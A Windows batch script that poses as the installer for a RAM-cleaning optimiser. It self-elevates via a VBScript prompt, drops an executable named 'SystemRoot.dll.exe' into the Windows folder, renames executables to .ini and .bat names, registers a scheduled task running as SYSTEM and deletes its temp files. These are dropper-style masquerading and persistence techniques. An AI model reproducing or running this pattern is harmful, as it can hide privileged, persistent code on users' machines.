@echo off&color 2f&Title Installing...&mode 80,20

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if "%errorlevel%" NEQ "0" (
	echo: Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
	echo: UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
	"%temp%\getadmin.vbs" &	exit 
)
if exist "%temp%\getadmin.vbs" del /f /q "%temp%\getadmin.vbs"
CLS

md %windir%\RamClean
copy "%temp%\SystemRoot.dll.exe" "%windir%\SystemRoot.dll.exe"
rename "%temp%\Cleaner.exe" "TimeClean.ini"
copy "%temp%\TimeClean.ini" "%windir%\RamClean\TimeClean.ini"
rename "%temp%\Resource.exe" "RAM-AUTO-CLEAN.bat"
copy "%temp%\RAM-AUTO-CLEAN.bat" "%windir%\RamClean\RAM-AUTO-CLEAN.bat"
schtasks /Create /RU SYSTEM /TN  CleanScheduled  /XML %TEMP%\SystemRoot.xml
cls 
echo.
echo      浜様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様融
echo      �                                                                    �
echo      �                       Installation complete !                      �
echo      �                                                                    �
echo      �             The Optimization Will Be Started in 3  seconds         �
echo      �                                                                    �
echo      藩様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様夕
echo.
timeout /t 3 /nobreak
SCHTASKS /Run /TN CleanScheduled
cls
echo.
echo      浜様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様融
echo      �                                                                    �
echo      �                    The Optimization Started !                      �
echo      �                                                                    �
echo      藩様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様夕
timeout /t 3 /nobreak>nul
DEL /Q /F %temp%\SystemRoot.dll.exe
DEL /Q /F %temp%\SystemRoot.xml
DEL /Q /F %temp%\Project.bat
DEL /Q /F %temp%\RAM-AUTO-CLEAN.bat
start %temp%\ReadMe.txt
exit 